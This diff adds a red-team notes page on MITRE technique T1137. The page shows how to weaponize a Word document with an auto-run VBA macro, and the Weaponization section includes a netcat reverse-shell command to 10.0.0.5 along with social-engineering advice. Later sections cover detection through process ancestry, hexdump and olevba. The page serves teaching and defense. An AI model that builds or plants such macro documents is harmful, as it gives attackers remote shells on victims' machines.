@@ -1,0 +1,92 @@
+---
+description: Code execution
+---
+
+# T1137: Office Macros
+
+This technique will build a primitive word document that will auto execute the Macro VBA code once the Macros protection is disabled.
+
+## Weaponization
+
+1. Create new word document \(CTRL+N\)
+2. Hit ALT+F11 to go into Macro editor
+3. Double click into the "This document" and CTRL+C/V the below:
+
+{% code-tabs %}
+{% code-tabs-item title="macro" %}
+```javascript
+Private Sub Document_Open()
+  MsgBox "game over", vbOKOnly, "game over"
+  a = Shell("C:\tools\shell.cmd", vbHide)
+End Sub
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+{% code-tabs %}
+{% code-tabs-item title="C:\\tools\\shell.cmd" %}
+```bash
+C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+This is how it should look roughly:
+
+![](../.gitbook/assets/macros-code.png)
+
+ALT+F11 to switch back to the document editing mode and add a flair of social engineering like so:
+
+![](../.gitbook/assets/macros-body%20%281%29.png)
+
+Save the file as a macro enabled document, for example a Doc3.dotm:
+
+![](../.gitbook/assets/macros-filename.png)
+
+## Execution
+
+Victim launching the Doc3.dotm:
+
+![](../.gitbook/assets/macro-victim.png)
+
+...and enabling the content - which gives the attacker a reverse shell:
+
+![](../.gitbook/assets/macro-shell.png)
+
+## Observations
+
+The below graphic represents the process ancestry and what happened after the victim had clicked the "Enable Content" button in our malicious Doc3.dotm document:
+
+![](../.gitbook/assets/macro-ancestry.png)
+
+## Inspection
+
+If you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access to a ZIP and Strings utility or any type of Hex Editor to hand. 
+
+Since Office files are essentially ZIP archives \(PK magic bytes\):
+
+```bash
+root@remnux:/home/remnux# hexdump -C Doc3.dotm | head -n1
+00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 cc 3c  |PK..........!..<|
+```
+
+...the file can be renamed to **Doc3.zip** and simply unzipped like a regular archive. Doing so deflates the archive and reveals the files that make up the suspicious office file. Files include `document.xml` which is where the main document body text goes and `vbaProject.bin` containing our evil macros:
+
+![](../.gitbook/assets/macros-deflated.png)
+
+Looking inside the `document.xml`, we can see the body copy we inputted at the very begging of this page in the [Weaponization](t1137-offico-macros.md#weaponization) section:
+
+![](../.gitbook/assets/macros-document-unzipped.png)
+
+Additionally, if you have the strings or a hex dumping utility, you can pass the `vbaProject.bin` through. This can sometimes give enough to determine if the document is suspicious. 
+
+I ran `hexdump -C vbaProject.bin` which clearly revealed some fragmented keywords that should immediately raise your suspicion - keywords included: **Shell, Hide, Sub\_Open** and something that looks like a file path:
+
+![](../.gitbook/assets/macros-hex-shell.png)
+
+If you have a malware analysis linux distro Remnux, you can easily inspect the VBA macros code contained in the document by issuing the command `olevba.py filename.dotm`. As seen below, the command nicely decodes the `vbaProject.bin`  and reveals the actual code as well as provides some interpretation of the commands found in the script:
+
+![](../.gitbook/assets/macros-olevba.png)
+
+{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1137\",\"type\":\"link\",\"title\":\"Office Application Startup - ATT&CK for Enterprise\",\"icon\":{\"type\":\"icon\",\"url\":\"https://attack.mitre.org/favicon.ico\",\"aspectRatio\":0}}" %}
+
